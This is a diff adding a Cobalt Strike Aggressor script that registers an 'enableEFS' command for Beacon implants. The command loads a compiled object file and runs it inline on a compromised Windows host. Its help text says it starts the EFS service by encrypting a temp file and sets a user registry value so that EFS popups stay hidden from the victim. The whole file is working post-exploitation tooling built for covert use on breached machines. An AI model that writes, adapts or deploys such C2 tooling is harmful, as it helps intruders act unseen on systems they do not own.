@@ -1,0 +1,20 @@
+# Author: buldansec
+# Version: 1.0
+# Last update: 06.07.2025
+
+beacon_command_register(
+    "enableEFS", "Starts the EFS service by creating a temp file and suppresses EFS UI popups for users.",
+    "INFO:\nStarts the EFS service by creating a temp file and encrypting it using EncryptFileW.\n" .
+    "Additionally, sets the EfsUIShown user registry value to prevent popups to the user.\n\n" .
+    "USAGE:\nenableEFS\n");
+
+alias enableEFS {
+    local('$bid $handle $data');
+    $bid = $1;
+
+    $handle = openf(script_resource("build/EnableEFS." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+	blog($bid, "Starting EnableEFS BOF by buldansec");
+    beacon_inline_execute($bid, $data, "go", $null);
+}
